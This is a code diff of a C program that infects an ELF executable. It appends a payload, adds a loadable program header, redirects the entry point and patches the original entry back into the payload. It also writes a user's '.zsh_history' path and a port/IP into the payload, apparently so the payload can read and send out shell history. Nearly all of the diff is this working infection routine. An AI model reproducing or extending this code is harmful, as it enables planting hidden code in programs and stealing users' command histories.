@@ -21,14 +21,7 @@ extern uint64_t CDECL_NORM(payload_size);
 #define payload_p &CDECL_NORM(payload)
 #define payload_size_p CDECL_NORM(payload_size)
 
-uint16_t port = 0;
-uint32_t addr_ip = 0;
-
 int main(int argc, char *argv[], char *envp[]) {
-    port = htons(3002);
-    addr_ip = htonl(INADDR_ANY);
-    printf("port: %#x %#x\n", port, addr_ip);
-
     int fd = open("testprog", O_RDWR);
     if (fd < 0) {
         perror("open");
@@ -52,16 +45,8 @@ int main(int argc, char *argv[], char *envp[]) {
         return 1;
     }
 
-    // Lire le header du fichier
-    uint8_t header[64];
-    if (pread(fd, header, sizeof(header), 0) != sizeof(header)) {
-        perror("pread");
-        close(fd);
-        return 1;
-    }
-
     // Read the ELF header
-    Elf32_Ehdr ehdr;
+    Elf64_Ehdr ehdr;
     if (pread(fd, &ehdr, sizeof(ehdr), 0) != sizeof(ehdr)) {
         perror("pread");
         close(fd);
@@ -74,16 +59,9 @@ int main(int argc, char *argv[], char *envp[]) {
         return 1;
     }
 
-    // Read the program headers
-    Elf32_Phdr phdr[ehdr.e_phnum];
-    if (pread(fd, phdr, sizeof(phdr), ehdr.e_phoff) != sizeof(phdr)) {
-        perror("pread");
-        close(fd);
-        return 1;
-    }
-
     // Determine the new entry point
-    uint32_t new_entry_point = size;
+    uint64_t old_entry_point = ehdr.e_entry;
+    uint64_t new_entry_point = size;
 
     // Add the payload to the end of the file
     if (pwrite(fd, payload_p, payload_size_p, size) != payload_size_p) {
@@ -101,7 +79,7 @@ int main(int argc, char *argv[], char *envp[]) {
     }
 
     // Write the new program header for the payload
-	Elf64_Phdr new_phdr = {
+    Elf64_Phdr new_phdr = {
         .p_type = PT_LOAD,
         .p_offset = size,
         .p_vaddr = new_entry_point,
@@ -113,7 +91,7 @@ int main(int argc, char *argv[], char *envp[]) {
     };
 
     // Append the new program header
-	if (pwrite(fd, &new_phdr, sizeof(new_phdr), ehdr.e_phoff + ehdr.e_phnum * sizeof(Elf64_Phdr)) != sizeof(new_phdr)) {
+    if (pwrite(fd, &new_phdr, sizeof(new_phdr), ehdr.e_phoff + ehdr.e_phnum * sizeof(Elf64_Phdr)) != sizeof(new_phdr)) {
         perror("pwrite");
         close(fd);
         return 1;
@@ -126,6 +104,7 @@ int main(int argc, char *argv[], char *envp[]) {
         close(fd);
         return 1;
     }
+
 
 	char *filepath = "/home/maxence/.zsh_history";
 	// Write the port and address IP to the end of the payload
@@ -148,9 +127,8 @@ int main(int argc, char *argv[], char *envp[]) {
         return 1;
     }
 
-    // Set the jump to the original entry point
-    uint64_t jump = ehdr.e_entry - (size + 4);
-    if (pwrite(fd, &jump, sizeof(jump), size + payload_size_p - 4 - 2 - 8) != sizeof(jump)) {
+    // Write the old entry point to the specified location in the payload
+    if (pwrite(fd, &old_entry_point, sizeof(old_entry_point), size + payload_size_p - 1190 - 4) != sizeof(old_entry_point)) {
         perror("pwrite");
         close(fd);
         return 1;
